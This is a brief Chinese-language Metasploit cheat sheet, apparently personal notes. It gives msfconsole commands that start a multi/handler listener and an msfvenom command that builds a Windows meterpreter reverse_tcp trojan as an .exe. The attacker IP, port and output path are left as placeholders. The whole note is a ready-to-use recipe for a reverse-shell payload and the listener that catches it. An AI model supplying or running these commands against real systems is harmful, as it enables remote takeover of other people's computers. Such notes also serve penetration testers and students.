## msfconsole
use multi/handler
set LHOST IP
set LPORT 端口
exploit
## msfvenom
`-l payloads` 回显所有可生成的木马
`-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=端口 -f exe -o 路径` 可以在 msfconsole 中使用

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTk4MDkyMzA4Nyw3MzUxNjQ3NTJdfQ==
-->